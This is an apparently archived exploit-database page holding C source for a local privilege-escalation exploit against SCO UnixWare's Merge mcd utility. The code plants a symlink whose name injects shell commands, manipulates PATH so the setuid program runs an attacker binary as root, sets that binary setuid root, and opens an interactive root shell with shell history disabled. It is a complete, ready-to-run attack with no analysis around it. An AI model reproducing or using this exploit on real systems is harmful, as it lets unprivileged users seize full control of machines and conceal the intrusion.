<html><head><title>SCO UnixWare Merge mcd Local Root Exploit</title></head><pre>/* 04/2008: public release
 * I have'nt seen any advisory on this; possibly still not fixed.
 *
 * SCO UnixWare Merge mcd Local Root Exploit
 * By qaaz
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/stat.h&gt;

#define TARGET	&quot;/usr/lib/merge/mcd&quot;
#define DIR	&quot;/proc/%d/object&quot;, getpid()
#define BIN	&quot;a.out&quot;
#define LNK	&quot;hrc;&quot; BIN &quot;;prc&quot;
#define DEV	&quot;/dev/cdrom/cdrom1&quot;

int	main(int argc, char *argv[])
{
	char		dir[4096], bin[4096];
	char		dev[4096], env[4096];
	pid_t		child;
	struct stat	st;

	if (geteuid() == 0) {
		setuid(geteuid());
		setgid(getegid());
		if (strstr(argv[0], BIN)) {
			umask(0);
			chown(BIN, 0, 3);
			chmod(BIN, 06777);
			kill(getppid(), 15);
			return 0;
		}
		putenv(&quot;HISTFILE=/dev/null&quot;);
		execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-i&quot;, NULL);
		printf(&quot;[-] sh: %s\n&quot;, strerror(errno));
		return 1;
	}

	printf(&quot;---------------------------------------\n&quot;);
	printf(&quot; UnixWare Merge mcd Local Root Exploit\n&quot;);
	printf(&quot; By qaaz\n&quot;);
	printf(&quot;---------------------------------------\n&quot;);

	if (access(TARGET, EX_OK) &lt; 0) {
		printf(&quot;[-] %s: %s\n&quot;, TARGET, strerror(errno));
		return 1;
	}

	if (symlink(DEV, LNK) &lt; 0) {
		printf(&quot;[-] %s: %s\n&quot;, LNK, strerror(errno));
		return 1;
	}

	sprintf(dir, DIR);
	sprintf(bin, &quot;%s/%s&quot;, dir, BIN);

	snprintf(dev, sizeof(dev), &quot;/dev/cdrom/../../%s/%s&quot;, getcwd(NULL, 4096), LNK);
	snprintf(env, sizeof(env), &quot;PATH=.:%s&quot;, getenv(&quot;PATH&quot;));

	if ((child = fork()) == 0) {
		chdir(dir);
		putenv(env);
		execl(TARGET, TARGET, &quot;-u&quot;, &quot;-d&quot;, dev, NULL);
		printf(&quot;[-] %s: %s\n&quot;, TARGET, strerror(errno));
		return 1;
	} /*else if (child != -1)
		waitpid(child, NULL, 0);*/

	printf(&quot;[*] Waiting for privs...\n&quot;);
	while (stat(bin, &amp;st) == 0) {
		if ((st.st_mode &amp; 06777) == 06777) {
			printf(&quot;[+] Enjoy\n&quot;);
			unlink(LNK);
			execl(bin, &quot;woot&quot;, NULL);
			printf(&quot;[-] %s: %s\n&quot;, bin, strerror(errno));
			return 1;
		}
		sleep(1);
	}
	printf(&quot;[-] %s: %s\n&quot;, bin, strerror(errno));
	unlink(LNK);
	return 0;
}

// milw0rm.com [2008-04-04]</pre></html>